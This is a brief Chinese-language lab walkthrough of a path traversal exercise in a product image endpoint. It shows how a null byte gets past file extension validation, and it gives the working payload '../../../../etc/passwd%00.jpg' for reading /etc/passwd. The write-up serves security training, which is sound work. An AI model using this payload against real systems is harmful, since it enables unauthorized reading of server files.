# 实验：文件路径遍历，通过空字节绕过文件扩展名验证

本实验在产品图片显示功能中包含一个路径遍历漏洞。

应用程序会验证提供的文件名是否以预期的文件扩展名结尾。

为了解决本实验，请检索 `/etc/passwd` 文件的内容。

## 步骤

探测
- 查看图片文件端点
    ```http
    GET /image?filename=17.jpg HTTP/2
    ```

- 尝试空字节截断
    `17.jpg%00.jpg`
    - 成功

- 尝试使用遍历序列访问目标文件
    `../../../../../../../../../../etc/passwd`
    - 失败

- 尝试使用空字节截断的遍历序列访问目标文件
    `../../../../../../../../../../etc/passwd%00.jpg`
    - 成功
